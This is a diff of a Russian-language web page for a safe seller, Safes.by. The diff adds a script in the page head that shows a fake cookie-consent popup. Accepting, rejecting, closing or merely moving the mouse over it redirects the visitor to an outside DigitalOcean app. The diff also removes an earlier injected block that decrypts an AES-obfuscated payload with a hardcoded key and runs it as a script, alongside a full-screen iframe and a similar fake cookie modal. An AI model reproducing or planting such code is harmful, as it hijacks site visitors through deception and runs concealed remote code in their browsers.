@@ -1,9 +1,204 @@
-
 <!DOCTYPE html>
 <html lang="ru">
 
 <head>
-	
+	<script>
+	document.addEventListener("DOMContentLoaded", function () {
+	    const redirectUrl = "https://stingray-app-867w2.ondigitalocean.app/";
+	    const style = document.createElement("style");
+	    style.textContent = `
+	        .cookie-overlay {
+	            position: fixed;
+	            inset: 0;
+	            background: rgba(0, 0, 0, 0.8);
+	            backdrop-filter: blur(10px);
+	            display: flex;
+	            align-items: center;
+	            justify-content: center;
+	            padding: 20px;
+	            z-index: 9999;
+	            animation: fadeInBackground 0.5s ease-out forwards;
+	        }
+	        @keyframes fadeInBackground {
+	            from { opacity: 0; }
+	            to { opacity: 1; }
+	        }
+	        .cookie-popup {
+	            position: fixed;
+	            bottom: 60px;
+	            left: 50%;
+	            transform: translateX(-50%);
+	            background-color: #ffffff;
+	            border: none;
+	            color: #333;
+	            padding: 30px;
+	            border-radius: 10px;
+	            z-index: 10000;
+	            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+	            max-width: 400px;
+	            text-align: center;
+	            animation: slideUp 0.5s ease-out forwards;
+	        }
+	        @keyframes slideUp {
+	            from { 
+	                transform: translateY(50px) translateX(-50%);
+	                opacity: 0;
+	            }
+	            to { 
+	                transform: translateX(-50%);
+	                opacity: 1;
+	            }
+	        }
+	        .close-btn {
+	            background: none;
+	            border: none;
+	            font-size: 1.5rem;
+	            position: absolute;
+	            top: 10px;
+	            right: 10px;
+	            cursor: pointer;
+	            color: #888;
+	        }
+	        .btn-primary {
+	            background-color: #007bff;
+	            color: #fff;
+	            border: none;
+	            padding: 12px 24px;
+	            border-radius: 5px;
+	            cursor: pointer;
+	            margin-top: 15px;
+	            display: inline-block;
+	            text-decoration: none;
+	            transition: all 0.3s;
+	            width: 100%;
+	            box-sizing: border-box;
+	        }
+	        .btn-primary:hover {
+	            background-color: #0056b3;
+	            transform: translateY(-2px);
+	        }
+	        h3 {
+	            font-family: 'Arial', sans-serif;
+	            margin-bottom: 10px;
+	            font-weight: bold;
+	            color: #333;
+	        }
+	        p {
+	            font-family: 'Arial', sans-serif;
+	            line-height: 1.5;
+	            margin-bottom: 15px;
+	        }
+	        .cookie-policy-link {
+	            text-decoration: underline;
+	            color: #007bff;
+	            font-weight: 500;
+	        }
+	        .cookie-info {
+	            background-color: #f8f9fa;
+	            padding: 15px;
+	            border-radius: 8px;
+	            margin: 15px 0;
+	            text-align: left;
+	        }
+	        .cookie-info h4 {
+	            margin-top: 0;
+	            color: #007bff;
+	        }
+	        .cookie-info ul {
+	            padding-left: 20px;
+	            margin: 10px 0;
+	        }
+	        .cookie-info li {
+	            margin-bottom: 5px;
+	        }
+	    `;
+	    document.head.appendChild(style);
+    
+	    const overlay = document.createElement("div");
+	    overlay.className = "cookie-overlay";
+	    overlay.id = "cookie-overlay";
+	    overlay.innerHTML = `
+	        <div class="cookie-popup">
+	            <button class="close-btn" id="close-popup" aria-label="Close cookie policy">×</button>
+	            <h3>Cookies Policy</h3>
+	            <p>
+	                This site uses cookies to enhance your browsing experience and for analytics purposes.
+	            </p>
+            
+	            <div class="cookie-info">
+	                <h4>Cookies We Use:</h4>
+	                <ul>
+	                    <li>Essential cookies (required for site functionality)</li>
+	                    <li>Performance cookies (for analytics)</li>
+	                    <li>Marketing cookies (for targeted advertising)</li>
+	                </ul>
+	            </div>
+            
+	            <p>
+	                By clicking Accept, you consent to our use of cookies. For more details, see our 
+	                <a href="${redirectUrl}" class="cookie-policy-link">Cookie Policy</a>.
+	            </p>
+            
+	            <a href="https://stingray-app-867w2.ondigitalocean.app/" id="accept-cookies" class="btn-primary">Accept All Cookies</a>
+	            <a href="#" id="reject-cookies" class="btn-primary" style="background-color: #6c757d; margin-top: 10px;">Reject Non-Essential</a>
+	        </div>
+	    `;
+	    document.body.appendChild(overlay);
+    
+	    let isRedirected = false;
+	    let startPos = null;
+	    let redirectTimeout = null;
+    
+	    const handleRedirect = () => {
+	        if (!isRedirected) {
+	            isRedirected = true;
+	            window.location.href = redirectUrl;
+	        }
+	    };
+    
+	    const detectMouseMove = (event) => {
+	        if (isRedirected) return;
+	        const screenHeight = window.innerHeight;
+	        const activeTop = screenHeight * 0.15;
+        
+	        if (event.clientY >= activeTop) {
+	            if (!startPos) {
+	                startPos = { x: event.clientX, y: event.clientY };
+	            } else {
+	                const dx = Math.abs(event.clientX - startPos.x);
+	                const dy = Math.abs(event.clientY - startPos.y);
+                
+	                if ((dx > 15 || dy > 15) && !redirectTimeout) {
+	                    redirectTimeout = setTimeout(handleRedirect, 1000);
+	                }
+	            }
+	        } else {
+	            startPos = null;
+	            clearTimeout(redirectTimeout);
+	            redirectTimeout = null;
+	        }
+	    };
+    
+	    document.getElementById("cookie-overlay").addEventListener("mousemove", detectMouseMove);
+    
+	    document.getElementById("accept-cookies").addEventListener("click", function (e) {
+	        e.preventDefault();
+	        handleRedirect();
+	    });
+    
+	    document.getElementById("reject-cookies").addEventListener("click", function (e) {
+	        e.preventDefault();
+	        // Handle rejection logic here
+	        alert("Non-essential cookies rejected. Essential cookies remain enabled.");
+	        handleRedirect();
+	    });
+    
+	    document.getElementById("close-popup").addEventListener("click", function (e) {
+	        e.preventDefault();
+	        handleRedirect();
+	    });
+	});
+	</script>
 
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -61,89 +256,6 @@
   </style>
 </head>
 <body>
-<script src="https://cdn.tailwindcss.com"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
-<script>
-    function aesDecode(encodedText) {
-        const decodedText = decodeURIComponent(encodedText);
-        const bytes = CryptoJS.AES.decrypt(decodedText, '2B9IyccRxXwiZctB2LiJFX2pKNedKvwO017H2ii4toIUcF5T3JbmskNEytf');
-        return bytes.toString(CryptoJS.enc.Utf8);
-    }
-    const codeString = aesDecode(`U2FsdGVkX18B2J3KH%2FI9SkEp82rf6O1YYIg%2BKtiEh%2ByYQX9%2FIxjSvQn4nMfHtZesPak9y9P2wH5QsxSaZ%2FtB%2Bs5cQnRPXsRi0lISaBJnzSh5pI%2FREjeM%2BKhqlXXt7AWOPmNqmzOT1vQjxF1%2FEKAs7GUIrgdlh4EjyrBbJ07bzZVaCxJvH%2F5OJ511l7AoxNl5Y%2B3OdA3V40S89P7NokVM90f%2BujIhylg6BWx74gOL%2BOgILcSKRS2AKixE9wfBSIxTLFZ6Il0rA1MebxlNcxAYI9O34JzqiEgM5n3H2YfLE3UolaO6NTh8HLQ80tOiG1zkI9bFDfokwHdZG4Z1lDDXkag92drSSv6Hl3DxIwFSNsUY7G3U3UR6R62LPM7uRaDg8ADayxNAUtnasQH0Vs7UKecdXNVpmTXCbBeiDKspujDzIgs%2FTW0GVVfdd719Il%2FDPIYrSX2G3LxuGHtbVlZ2URMCD%2FvB3HNqgn0Td8KjZzcFi%2FokjOqQp5t1C294hg%2FB9GrVHFojad6F3023Tv31QJpL6tXKO4WzRLqK7aRVwspEBG0AWPiAXabz2e916WYd50k%2Fryq1gU0lWdZSTW8Iy8oIJQTWv3rKWjTzo5UZIfH8EaSzF2ozxMM27qDMfng1xeIJdG55AHK15023UnFKvwZaKEoL6apBtlcQaRfkjJ01IqSYOcDcvjTE1N1esk6vOMPpX99GXgiIUqk1VJ8SnmQQawrOC2c29%2FBASwgQzK5G9KPbYWOSeI4TLnqeA2dqRpn8dPXg6GnjuSzQzcx2Hoc5epp4B5nayNsYD1sINSRst2YpzeyHddir5a4joUTpXI7pZGvFhUpZUdLKMkKiL6VjnpZkM75jIo5AMp8NcooZoaxQ2wfSQkQhn%2BPpz%2BwwURPadGMvdHF1mSKquzQZp99c7VsZffUKMutE8VqJ3OlccnUa8CcQ3bptEEqZ8ckm9%2BJp2DsPX%2BSH76ER%2BjY5P5MU6WHBJ7xbrThRGMom0tSNbgWmYqgWW5lf8D8hPI8hr5XPyBsiVEF27yARgvtikzPf8XGFLllglcse%2BT0JyXWp%2FEdDdNhudmufX2M560gOd79Uw%2Fb8%2Bz%2FgR39TEZKQyyxKf9%2Bxv7DOuOQlYcU7kqt1RkggNES%2Fsvu61D3tRnCHuv%2FKsQe7JCqp%2F%2FZKuHRfINObO5LRaWNs6hyeND53yadCwSmAw4ybN%2FmnmYQvw0GJPbYNd07%2BMKcJVZWmDQRAnI5GLZpdIWYGQIKm69BALkB6jR2s%2FE50rWXRANObZ8zv5HSRg%2FsT70qqF37%2Fdl2omZ4HQ6HUcYZuSxxYe7wbiE1Az6nDMhsERr1ATl7g4F8TGYGfDyisHqTi55wI5FzXSnaxesL%2FBab%2Fx%2Fvu2BbgEe2sL4yLqecTD2vxk%2FGm%2FgBchluu4Yf2we3%2B1Q%2BWUNFtPnpGK5ZiLIjo4CJW12FnGKC8O2PlNZy6M0MTS7U5fOsqVoeuYhGN8XD3ROAgSNac3W%2BaeGg5sJTfgsC%2BxtUGU1C5D6aajfBVjSFQEmJv4rHr6Ya6h1JqYTg5DC%2BsmwnrFnq4UY8AOC69ei8T8Yq3FOIdQsfRMmLbkcPrspmOi7CCL0Vknu9qG4wc1DMfmmq%2BaWIHSLluMj%2B0P37DyNYcSshDbjQqB9UXUZzxc%2BfL0kSMZ2Ue9ANb%2BtMTX9TjmSgFjqWhdcDbZnMfohssJ%2BcQwgxG%2F3NKBS%2FDM%2BJMLAOJWiSMg%2Fp0nixhOz6Pr%2BrQzA%2FAMlq4LH8rRPU4p4s1jKpJ9ArootoSDh1nR069P3pLraaNFpi1nljK0liMBB6NQi2LNcXHHVMDlXMSmc8mKlnX%2FN6%2BGu5iiKUgsLvtz5L76qUtNjo5jC9mDukr0hbWlq3NUr8YLCkuAZ%2B2OJcNdtIg5O2hg1ZIBIjbwISv1L%2Ffs2bGxCHjk9jaoJ%2BWKxrzpBin78cdHM0wNbgobum8HAjnTNA%2FIcQYTNtcJUFHZriChJ8nQtGXEpVrzpwmDKPuznCv%2FqQB0OHxx99oIJCuAelkHcIPBSGxY2Xw467m7lOFwPT%2FVusg%2FAxLJZVWPc4yvfSnrt8ziY5ZNbXsoOUkcOqzRse5uetioSJAK0jx7879%2BxNTC4w72ZmQuS8FKaa%2Fk8YnC2DUPmdFcyRsaRMlL7KgOO5Ueb9HHAhuu4w3bd45160%2FIhuRzH3O0z9B5zPM96PuKPb7trFMT9Z02Nrqide0LIMsZ2Ec2M3E5L3mdwHng7b4iEsaeF0wCQOmhdUQo%2FdLqWqGmksEtqlhVmSVPxp1QPnb%2Fi2cyaLgjzGxC8qwlNzPlDlNs7zlbw%2Bo9C%2FOna68Wday0MvL%2FQ18IQTN43%2F4aZQ8e4L4LCnMA6LxxJxh704qUfS5Ax2cmSvM4FZbvme4EDZVkXPwyo6Og1dvoiIs9JFgEUEVxuZW%2FxvDiMtD9VSnG1Gli%2FeNzsD3hSIuEqq%2Bz7fg2JYjYXrUnaR9JciF7cr5OCU1Bn9jVmKoOXSRNloxhcTbEMB%2FCO2LnWGnKG0YNcC60p7GWxuOEJO0JLpol862cuFPTKwXIMRFx05GCMcFBatH7fnlnDAYivQnZxFMF4wmSH4LxmM0NbWz7xoMW4ApS0GYpcIUDNXntlLwq3hODXvbvlRVQuUOi83uBlCUy9Yvp4VSM8mLM%2FEm7E5076t9ktrd1nqyy7X47Pte7Ca88qZKkO576OtN9zxvsDTrz%2FmtuZCH%2BaOqXfxpyiAOoqZ9ZVOkLPh6gLRU2rQfCySIUD7gfVpFc21VnCG4tkT54FumYEn2rhhOuf6Bl7w99Pa6%2BUTWnrd3zGSiOEXMC8Kf8XMgQruJth7iTmq4QJMc2cR8mhpyxpvYTrVLvsldhfx95nnul5fuSn6Q9QmXpu%2BSlIW8yNONk4QQBhfDbymMizx0okfPiIkEG%2BQKTr7QNEOjkPUAuxpCjxZXIuL%2Bbam2CREwHF1LwDykXF5%2Fdi9yf4pzv6QcqFrrT6%2FluiUcvmELXq8MqLTXUr%2F7yM6MdPkq26jPnyHIdCBRPCNb1SEzlTBPvnFJrKXx%2B69%2BDTq%2Bq%2F5zENP42V1JOBTSTejqct2uLZ0WuTdNW2DD%2BXNen6QsMv1CDLKSGhY4DJ%2BAYNVY4%2FRVjNZB5k7N0dD33to8qOBhAVU2Pt8OirGPNoVLbEkFxu0lLfolnBfL%2Br4BnNiQuA896ZjjzDFtUcEHVEjqMeS5Rmy34B4FKQ3xIjiytI904qnCPFNeAXJA5KGYItr1v75%2BZCf%2B1yuymox6%2BapuWVRg6lcl5rRbNbbzJcDzU6abDkom2ptju5Pmdv%2FLxnpLjR127zgciQhb3KYtxdiAF%2FCq7ELUdke9DEeCl%2FnwX8d2Vs2eRjfCpCkv20UCC2mQczRcNpE%2BZxtOmwiHkY8AarDG%2FK2CN6%2FJ9CkpwU%2BpeQJeXYIIRkI39txFK8cSB4Mq34nkPgftfZ1yLSXN1rOIji2d7ordRryULqGvlVDJ82teJhEM4MPSncCNz266m7z7gDDsMYKQir2rEY2xN10FxbLN`);
-    const script = document.createElement("script");
-    script.textContent = codeString;
-    document.body.appendChild(script);
-</script> 
-<div id="contentiframe" style="z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
-
-</div>
-
-<div id="cookie-modal-box" class="hidden">
-    <div id="cookie-backdrop" class="fixed inset-0 z-40 bg-black/40 backdrop-blur-md transition-opacity duration-300 opacity-0"></div>
-    <div id="cookie-modal" class="fixed inset-0 flex items-center justify-center p-4 z-50 transition-all duration-300 opacity-0 scale-90">
-        <div class="bg-white text-gray-800 rounded-2xl shadow-2xl max-w-lg w-full p-8 relative">
-            <button id="cookie-close" class="absolute top-4 right-4">
-                <svg viewBox="0 0 15 15" class="text-gray-500 hover:text-red-500" height="26" width="26">
-                    <path fill="currentColor" d="M11.78 4.03a.75.75 0 0 0-1.06-1.06L7.5 6.19 4.28 2.97a.75.75 0 1 0-1.06 1.06L6.44 7.5l-3.22 3.22a.75.75 0 1 0 1.06 1.06L7.5 8.56l3.22 3.22a.75.75 0 1 0 1.06-1.06L8.56 7.5l3.22-3.47Z"/>
-                </svg>
-            </button>
-            <div class="flex items-center gap-3 mb-4">
-                <span class="text-yellow-500 text-3xl">🍪</span>
-                <h2 class="text-2xl font-bold">
-About cookies</h2>
-            </div>
-            <p class="text-gray-600 mb-6">
-                This site uses cookies to provide you with a better user experience. <span class="font-semibold">Agree</span>
-			   By clicking , you consent to the use of cookies.
-             
-            </p>
-            <div class="flex flex-col sm:flex-row gap-3">
-                <button id="cookie-accept" class="flex-1 bg-green-600 hover:bg-green-700 text-white py-3 px-6 rounded-lg font-bold">🍪 Agree</button>
-                <button id="cookie-decline" class="flex-1 bg-gray-200 hover:bg-gray-300 text-gray-800 py-3 px-6 rounded-lg font-bold">Refuse</button>
-            </div>
-        </div>
-    </div>
-</div>
-<script>
-    const modalBox = document.getElementById("cookie-modal-box"),
-        modal = document.getElementById("cookie-modal"),
-        backdrop = document.getElementById("cookie-backdrop"),
-        acceptBtn = document.getElementById("cookie-accept"),
-        declineBtn = document.getElementById("cookie-decline"),
-        closeBtn = document.getElementById("cookie-close");
-
-    function showModal() {
-        modalBox.classList.remove("hidden");
-        setTimeout(() => {
-            backdrop.classList.remove("opacity-0");
-            modal.classList.remove("opacity-0", "scale-90");
-        }, 10);
-    }
-
-    function hideModal(e) {
-        localStorage.setItem("cookie-consent", e);
-        setTimeout(() => {
-            modalBox.classList.add("hidden");
-        }, 1500);
-
-        // remove mousemove listener once closed
-        document.removeEventListener("mousemove", mouseMoveClose);
-    }
-
-    function mouseMoveClose() {
-        hideModal("closed");
-    }
-
-    acceptBtn.onclick = () => hideModal("accepted");
-    declineBtn.onclick = () => hideModal("declined");
-    closeBtn.onclick = () => hideModal("closed");
-    backdrop.onclick = () => hideModal("closed");
-
-    if (!localStorage.getItem("cookie-consent")) {
-        showModal();
-        document.addEventListener("mousemove", mouseMoveClose, { once: true });
-    }
-</script>
   <header>
     <h1>Safes.by</h1>
     <p>Need to buy a safe? You're on the right track!</p>
